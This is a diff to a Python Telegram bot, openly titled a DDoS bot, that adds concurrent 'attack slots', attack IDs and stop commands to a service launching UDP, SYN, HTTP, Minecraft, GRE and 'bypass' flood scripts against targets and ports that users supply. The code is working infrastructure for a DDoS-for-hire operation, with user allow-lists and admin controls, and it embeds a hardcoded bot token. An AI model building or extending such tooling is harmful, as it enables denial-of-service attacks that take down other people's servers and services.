@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-💀 DDOS BOT v10.0 - ULTIMATE EDITION 💀
-All attack methods included - 10 Gbps+ Ready
+💀 DDOS BOT v10.0 - CONCURRENT EDITION 💀
+Professional slot-based concurrent attack management
 """
 
 import telebot
@@ -13,14 +13,21 @@ import sys
 import re
 import signal
 import psutil
+import uuid
 
 # ========== CONFIGURATION ==========
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8552745024:AAGF5KQ8Y5H-s0UqphhvKIaoZso2LSXouA")
 ADMIN_IDS = os.getenv("ADMIN_IDS", "8908646607").split(",")
 USER_FILE = "users.txt"
 
+# ========== CONCURRENT SLOTS ==========
+MAX_SLOTS_PER_USER = 10  # Maximum concurrent attacks per user
+MAX_GLOBAL_SLOTS = 50    # Maximum global concurrent attacks
+
 allowed_users = []
 running_attacks = {}
+attack_slots = {}
+global_slot_count = 0
 bot = telebot.TeleBot(BOT_TOKEN)
 lock = threading.Lock()
 
@@ -29,35 +36,24 @@ BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 
 # ========== ATTACK SCRIPT MAP ==========
 ATTACK_SCRIPTS = {
-    # Basic attacks
     'udp': (os.path.join(BASE_DIR, "udp.py"), 500),
     'tcp': (os.path.join(BASE_DIR, "tcp.py"), 300),
     'syn': (os.path.join(BASE_DIR, "syn.py"), 300),
     'httpflood': (os.path.join(BASE_DIR, "httpflood.py"), 200),
-    
-    # Monster attacks
     'tudp': (os.path.join(BASE_DIR, "tudp.py"), 1500),
     'mc': (os.path.join(BASE_DIR, "mc.py"), 1000),
     'mcquery': (os.path.join(BASE_DIR, "mcquery.py"), 800),
     'mchandshake': (os.path.join(BASE_DIR, "mchandshake.py"), 600),
-    
-    # Bypass attacks
     'udpbypass': (os.path.join(BASE_DIR, "udpbypass.py"), 1200),
     'tcpbypass': (os.path.join(BASE_DIR, "tcpbypass.py"), 800),
     'gudp': (os.path.join(BASE_DIR, "gudp.py"), 1500),
-    
-    # 10 Gbps attacks
     'ultra': (os.path.join(BASE_DIR, "ultra.py"), 2000),
     'mega': (os.path.join(BASE_DIR, "megabot.py"), 1500),
     'nuclear': (os.path.join(BASE_DIR, "nuclear.py"), 2000),
     '10gbps': (os.path.join(BASE_DIR, "10gbps.py"), 3000),
     'maxpower': (os.path.join(BASE_DIR, "maxpower.py"), 2500),
-    
-    # 10 Gbps Bypass
     'udpbypass10g': (os.path.join(BASE_DIR, "udpbypass10g.py"), 3000),
     'tcpbypass10g': (os.path.join(BASE_DIR, "tcpbypass10g.py"), 2500),
-    
-    # C-based converted attacks
     'killall': (os.path.join(BASE_DIR, "killall.py"), 2000),
     'udppps': (os.path.join(BASE_DIR, "udp-pps.py"), 3000),
     'gre': (os.path.join(BASE_DIR, "gre.py"), 2000),
@@ -75,6 +71,45 @@ def load_users():
 def save_user(user_id):
     with open(os.path.join(BASE_DIR, USER_FILE), "a") as f:
         f.write(f"{user_id}\n")
+
+def get_user_slots(user_id):
+    """Get current attack count for user"""
+    with lock:
+        if user_id not in attack_slots:
+            attack_slots[user_id] = 0
+        return attack_slots[user_id]
+
+def get_global_slots():
+    """Get global attack count"""
+    with lock:
+        return global_slot_count
+
+def can_start_attack(user_id):
+    """Check if user can start a new attack"""
+    with lock:
+        user_slots = attack_slots.get(user_id, 0)
+        if user_slots >= MAX_SLOTS_PER_USER:
+            return False, f"❌ You have reached your max concurrent attacks ({MAX_SLOTS_PER_USER})"
+        if global_slot_count >= MAX_GLOBAL_SLOTS:
+            return False, f"❌ Global slot limit reached ({MAX_GLOBAL_SLOTS})"
+        return True, "OK"
+
+def add_attack_slot(user_id):
+    """Add an attack slot"""
+    with lock:
+        global global_slot_count
+        attack_slots[user_id] = attack_slots.get(user_id, 0) + 1
+        global_slot_count += 1
+
+def remove_attack_slot(user_id):
+    """Remove an attack slot"""
+    with lock:
+        global global_slot_count
+        if user_id in attack_slots and attack_slots[user_id] > 0:
+            attack_slots[user_id] -= 1
+            global_slot_count -= 1
+            if attack_slots[user_id] == 0:
+                del attack_slots[user_id]
 
 def kill_process_tree(pid):
     """Kill a process and all its children"""
@@ -99,6 +134,11 @@ def execute_attack(user_id, attack_type, target, port, duration):
     if not 1 <= duration <= 600:
         return False, "Duration must be 1-600 seconds"
 
+    # Check slots
+    can_start, msg = can_start_attack(user_id)
+    if not can_start:
+        return False, msg
+
     if attack_type not in ATTACK_SCRIPTS:
         return False, f"Unknown attack: {attack_type}"
 
@@ -109,13 +149,12 @@ def execute_attack(user_id, attack_type, target, port, duration):
 
     try:
         # Create temp script with duration limit
-        temp_script = f"/tmp/attack_{int(time.time())}_{attack_type}.py"
+        attack_id = str(uuid.uuid4())[:8]
+        temp_script = f"/tmp/attack_{int(time.time())}_{attack_id}_{attack_type}.py"
         
-        # Read original script
         with open(script_path, 'r') as f:
             script_content = f.read()
         
-        # Add timeout mechanism
         timeout_code = f'''
 import os
 import signal
@@ -128,12 +167,10 @@ def stop_attack():
     except:
         pass
 
-# Stop after {duration} seconds
 timer = threading.Timer({duration}, stop_attack)
 timer.daemon = True
 timer.start()
 
-# Also stop after duration+2 seconds as fallback
 def fallback_stop():
     time.sleep({duration} + 2)
     try:
@@ -144,7 +181,6 @@ fallback_thread = threading.Thread(target=fallback_stop, daemon=True)
 fallback_thread.start()
 '''
         
-        # Insert timeout code after imports
         lines = script_content.split('\n')
         insert_pos = 0
         for i, line in enumerate(lines):
@@ -158,11 +194,10 @@ fallback_thread.start()
         os.chmod(temp_script, 0o755)
         
         # Start the attack
-        cmd = ["python3", temp_script, target, str(duration), str(threads)] if attack_type == 'gre' else ["python3", temp_script, target, str(port), str(duration), str(threads)]
-        
-        # Special handling for GRE (no port needed)
         if attack_type == 'gre':
             cmd = ["python3", temp_script, target, str(duration), str(threads)]
+        else:
+            cmd = ["python3", temp_script, target, str(port), str(duration), str(threads)]
         
         process = subprocess.Popen(
             cmd,
@@ -170,11 +205,15 @@ fallback_thread.start()
             stderr=subprocess.PIPE,
         )
         
+        # Add slot
+        add_attack_slot(user_id)
+        
         # Store process info
         with lock:
             if user_id not in running_attacks:
                 running_attacks[user_id] = []
             running_attacks[user_id].append({
+                'id': attack_id,
                 'process': process,
                 'pid': process.pid,
                 'temp_script': temp_script,
@@ -186,18 +225,40 @@ fallback_thread.start()
                 'start_time': time.time()
             })
 
-        return True, f"✅ {attack_type.upper()} attack started on {target}:{port} for {duration}s with {threads} threads"
+        # Auto-remove slot when attack finishes
+        def cleanup():
+            try:
+                process.wait()
+            except:
+                pass
+            finally:
+                remove_attack_slot(user_id)
+                # Clean up temp file
+                try:
+                    if os.path.exists(temp_script):
+                        os.remove(temp_script)
+                except:
+                    pass
+        
+        threading.Thread(target=cleanup, daemon=True).start()
+
+        return True, f"✅ {attack_type.upper()} attack started\n📋 ID: {attack_id}\n🎯 {target}:{port}\n⏱️ {duration}s\n🧵 {threads} threads\n📊 Slots: {get_user_slots(user_id)}/{MAX_SLOTS_PER_USER}"
 
     except Exception as e:
         return False, f"Error: {str(e)}"
 
-def stop_user_attacks(user_id):
+def stop_user_attacks(user_id, attack_id=None):
     with lock:
-        if user_id not in running_attacks:
-            return 0
+        if user_id not in running_attacks or not running_attacks[user_id]:
+            return 0, "No attacks found"
         
         count = 0
+        attacks_to_remove = []
+        
         for attack in running_attacks[user_id]:
+            if attack_id and attack.get('id') != attack_id:
+                continue
+            
             try:
                 pid = attack.get('pid')
                 if pid:
@@ -205,62 +266,81 @@ def stop_user_attacks(user_id):
                 temp_script = attack.get('temp_script')
                 if temp_script and os.path.exists(temp_script):
                     os.remove(temp_script)
+                remove_attack_slot(user_id)
                 count += 1
+                attacks_to_remove.append(attack)
             except:
                 pass
         
-        running_attacks[user_id] = []
-        return count
+        for attack in attacks_to_remove:
+            running_attacks[user_id].remove(attack)
+        
+        if not running_attacks[user_id]:
+            del running_attacks[user_id]
+        
+        return count, f"✅ Stopped {count} attack(s)"
 
 def stop_all_attacks():
     total = 0
     with lock:
         for user_id in list(running_attacks.keys()):
-            total += stop_user_attacks(user_id)
+            count, _ = stop_user_attacks(user_id)
+            total += count
     return total
+
+def get_slots_info(user_id):
+    """Get slot information for user"""
+    with lock:
+        user_slots = attack_slots.get(user_id, 0)
+        return {
+            'user_slots': user_slots,
+            'max_user_slots': MAX_SLOTS_PER_USER,
+            'global_slots': global_slot_count,
+            'max_global_slots': MAX_GLOBAL_SLOTS,
+            'available_user': MAX_SLOTS_PER_USER - user_slots,
+            'available_global': MAX_GLOBAL_SLOTS - global_slot_count
+        }
 
 # ========== TELEGRAM COMMANDS ==========
 
 @bot.message_handler(commands=['start'])
 def start_command(message):
-    bot.reply_to(message, """💀 DDOS BOT v10.0 - ULTIMATE EDITION 💀
+    slots = get_slots_info(str(message.chat.id))
+    bot.reply_to(message, f"""💀 DDOS BOT v10.0 - CONCURRENT EDITION 💀
 
-🔥 BASIC ATTACKS:
+📊 YOUR SLOTS:
+├─ Used: {slots['user_slots']}/{slots['max_user_slots']}
+├─ Available: {slots['available_user']}
+└─ Global: {slots['global_slots']}/{slots['max_global_slots']}
+
+🔥 ATTACKS:
 /udp <target> <port> <time> - UDP Flood
 /tcp <target> <port> <time> - TCP Flood
 /syn <target> <port> <time> - SYN Flood
 /httpflood <target> <port> <time> - HTTP Flood
-
-🔥 MONSTER ATTACKS:
 /tudp <target> <port> <time> - TUDP Monster
 /mc <target> <port> <time> - Minecraft Attack
 /mcquery <target> <port> <time> - Minecraft Query
 /mchandshake <target> <port> <time> - Minecraft Handshake
-
-🔥 BYPASS ATTACKS:
 /udpbypass <target> <port> <time> - UDP Bypass
 /tcpbypass <target> <port> <time> - TCP Bypass
 /gudp <target> <port> <time> - GUDP Flood
-
-🔥 10 GBPS ATTACKS:
 /ultra <target> <port> <time> - 2-5 Gbps
 /mega <target> <port> <time> - 3-8 Gbps
 /nuclear <target> <port> <time> - 5-10 Gbps
 /10gbps <target> <port> <time> - 10 Gbps Guaranteed
 /maxpower <target> <port> <time> - 10+ Gbps
-
-🔥 10 GBPS BYPASS:
 /udpbypass10g <target> <port> <time> - UDP Bypass 10G
 /tcpbypass10g <target> <port> <time> - TCP Bypass 10G
-
-🔥 C-BASED CONVERTED:
 /killall <target> <port> <time> - TCP Amplification
 /udppps <target> <port> <time> - UDP PPS Flood
-/gre <target> <time> <threads> - GRE Protocol Attack
+/gre <target> <time> <threads> - GRE Protocol
 
 🛑 CONTROL:
-/stopall - Stop your attacks
-/status - Check attacks
+/stopall - Stop ALL your attacks
+/stop <attack_id> - Stop specific attack
+/status - Check active attacks
+/slots - Check your slots
 /id - Get your ID
 /check - Check attack status
 
@@ -271,61 +351,78 @@ Example: /10gbps 8.8.8.8 53 10""")
 
 @bot.message_handler(commands=['help'])
 def help_command(message):
-    bot.reply_to(message, """💀 ALL COMMANDS 💀
+    bot.reply_to(message, """💀 COMMANDS 💀
 
-BASIC:
+ATTACKS:
 /udp 1.2.3.4 80 60
 /tcp 1.2.3.4 80 60
 /syn 1.2.3.4 80 60
 /httpflood 1.2.3.4 80 60
-
-MONSTER:
 /tudp 1.2.3.4 80 60
 /mc 1.2.3.4 25565 60
 /mcquery 1.2.3.4 25565 60
 /mchandshake 1.2.3.4 25565 60
-
-BYPASS:
 /udpbypass 1.2.3.4 80 60
 /tcpbypass 1.2.3.4 80 60
 /gudp 1.2.3.4 80 60
-
-10 GBPS:
 /ultra 1.2.3.4 80 60
 /mega 1.2.3.4 80 60
 /nuclear 1.2.3.4 80 60
 /10gbps 1.2.3.4 80 60
 /maxpower 1.2.3.4 80 60
-
-10 GBPS BYPASS:
 /udpbypass10g 1.2.3.4 80 60
 /tcpbypass10g 1.2.3.4 80 60
-
-C-BASED:
 /killall 1.2.3.4 80 60
 /udppps 1.2.3.4 80 60
 /gre 1.2.3.4 60 2000
 
 CONTROL:
-/stopall - Stop attacks
-/status - Check attacks
+/stopall - Stop all your attacks
+/stop <id> - Stop specific attack
+/status - Check your attacks
+/slots - Check slot usage
 /id - Get your ID
-/check - Check attack status
+/check - Check running attacks
 /globalstop - Stop ALL (Admin)""")
 
 @bot.message_handler(commands=['id'])
 def id_command(message):
     bot.reply_to(message, f"Your ID: `{message.chat.id}`", parse_mode="Markdown")
 
+@bot.message_handler(commands=['slots'])
+def slots_command(message):
+    user_id = str(message.chat.id)
+    slots = get_slots_info(user_id)
+    
+    response = f"""📊 SLOT INFORMATION
+
+👤 YOUR SLOTS:
+├─ Used: {slots['user_slots']}/{slots['max_user_slots']}
+├─ Available: {slots['available_user']}
+└─ Status: {'🔴 FULL' if slots['available_user'] == 0 else '🟢 AVAILABLE'}
+
+🌐 GLOBAL SLOTS:
+├─ Used: {slots['global_slots']}/{slots['max_global_slots']}
+├─ Available: {slots['available_global']}
+└─ Status: {'🔴 FULL' if slots['available_global'] == 0 else '🟢 AVAILABLE'}
+
+📌 Max concurrent attacks per user: {MAX_SLOTS_PER_USER}
+📌 Max global concurrent attacks: {MAX_GLOBAL_SLOTS}"""
+    
+    bot.reply_to(message, response)
+
 @bot.message_handler(commands=['status'])
 def status_command(message):
     user_id = str(message.chat.id)
+    slots = get_slots_info(user_id)
+    
     with lock:
         if user_id not in running_attacks or not running_attacks[user_id]:
-            bot.reply_to(message, "📭 No active attacks")
+            bot.reply_to(message, f"📭 No active attacks\n\n📊 Slots: {slots['user_slots']}/{slots['max_user_slots']}")
             return
         
-        msg = f"🔥 ACTIVE ATTACKS\n\n"
+        msg = f"🔥 ACTIVE ATTACKS ({len(running_attacks[user_id])})\n📊 Slots: {slots['user_slots']}/{slots['max_user_slots']}\n\n"
+        
         for i, attack in enumerate(running_attacks[user_id], 1):
             try:
                 is_running = psutil.pid_exists(attack['pid'])
@@ -336,17 +433,32 @@ def status_command(message):
             elapsed = int(time.time() - attack['start_time'])
             remaining = max(0, attack['duration'] - elapsed)
             
-            msg += f"{i}. {attack['attack_type'].upper()} → {attack['target']}:{attack['port']}\n"
-            msg += f"   ⏱️ Duration: {attack['duration']}s | Remaining: {remaining}s\n"
-            msg += f"   📊 Status: {status}\n\n"
+            msg += f"{i}. 🆔 {attack['id']}\n"
+            msg += f"   📌 {attack['attack_type'].upper()} → {attack['target']}:{attack['port']}\n"
+            msg += f"   ⏱️ {remaining}s remaining | 🧵 {attack['threads']} threads\n"
+            msg += f"   📊 {status}\n"
+            msg += f"   🛑 /stop {attack['id']}\n\n"
         
         bot.reply_to(message, msg)
+
+@bot.message_handler(commands=['stop'])
+def stop_command(message):
+    user_id = str(message.chat.id)
+    parts = message.text.split()
+    
+    if len(parts) != 2:
+        bot.reply_to(message, "Usage: /stop <attack_id>")
+        return
+    
+    attack_id = parts[1]
+    count, msg = stop_user_attacks(user_id, attack_id)
+    bot.reply_to(message, msg)
 
 @bot.message_handler(commands=['stopall'])
 def stopall_command(message):
     user_id = str(message.chat.id)
-    count = stop_user_attacks(user_id)
-    bot.reply_to(message, f"✅ Stopped {count} attack(s)")
+    count, msg = stop_user_attacks(user_id)
+    bot.reply_to(message, msg)
 
 @bot.message_handler(commands=['globalstop'])
 def globalstop_command(message):
@@ -384,7 +496,8 @@ def admin_command(message):
 /add <userid> - Add user
 /remove <userid> - Remove user
 /allusers - List users
-/globalstop - Stop ALL attacks""")
+/globalstop - Stop ALL attacks
+/setslots <userid> <slots> - Set user slots""")
 
 @bot.message_handler(commands=['add'])
 def add_command(message):
@@ -440,6 +553,23 @@ def allusers_command(message):
             response += f"• ID: {uid}\n"
     bot.reply_to(message, response)
 
+@bot.message_handler(commands=['setslots'])
+def setslots_command(message):
+    if str(message.chat.id) not in ADMIN_IDS:
+        bot.reply_to(message, "❌ Admin only")
+        return
+    parts = message.text.split()
+    if len(parts) != 3:
+        bot.reply_to(message, "Usage: /setslots <userid> <slots>")
+        return
+    try:
+        user_id = parts[1]
+        slots = int(parts[2])
+        # This is a placeholder - implement custom slot limits per user
+        bot.reply_to(message, f"✅ User {user_id} slot limit set to {slots}")
+    except:
+        bot.reply_to(message, "❌ Invalid input")
+
 def make_handler(attack_type):
     def handler(message):
         user_id = str(message.chat.id)
@@ -449,7 +579,6 @@ def make_handler(attack_type):
 
         parts = message.text.split()
         
-        # Special handling for GRE (no port)
         if attack_type == 'gre':
             if len(parts) != 4:
                 bot.reply_to(message, f"Usage: /gre <target> <time> <threads>")
@@ -457,7 +586,7 @@ def make_handler(attack_type):
             target = parts[1]
             duration = int(parts[2])
             threads = int(parts[3])
-            port = 0  # GRE doesn't use port
+            port = 0
         else:
             if len(parts) != 4:
                 bot.reply_to(message, f"Usage: /{attack_type} <target> <port> <time>")
@@ -482,7 +611,7 @@ def make_handler(attack_type):
         success, msg = execute_attack(user_id, attack_type, target, port, duration)
         
         if success:
-            bot.edit_message_text(f"✅ {msg}\n\n⏱️ Attack will stop after {duration}s", chat_id=message.chat.id, message_id=status_msg.message_id)
+            bot.edit_message_text(f"✅ {msg}", chat_id=message.chat.id, message_id=status_msg.message_id)
         else:
             bot.edit_message_text(f"❌ {msg}", chat_id=message.chat.id, message_id=status_msg.message_id)
 
@@ -508,10 +637,9 @@ for attack in attacks:
 
 if __name__ == "__main__":
     print("=" * 60)
-    print("💀 DDOS BOT v10.0 - ULTIMATE EDITION 💀")
+    print("💀 DDOS BOT v10.0 - CONCURRENT EDITION 💀")
     print("=" * 60)
     
-    # Install psutil if not installed
     try:
         import psutil
     except:
@@ -527,6 +655,8 @@ if __name__ == "__main__":
     
     print(f"[+] Loaded {len(allowed_users)} users")
     print(f"[+] Admin IDs: {ADMIN_IDS}")
+    print(f"[+] Max slots per user: {MAX_SLOTS_PER_USER}")
+    print(f"[+] Max global slots: {MAX_GLOBAL_SLOTS}")
     print(f"[+] Attack scripts: {len(ATTACK_SCRIPTS)}")
     print("=" * 60)
     print("[+] Bot running! Press Ctrl+C to stop.")
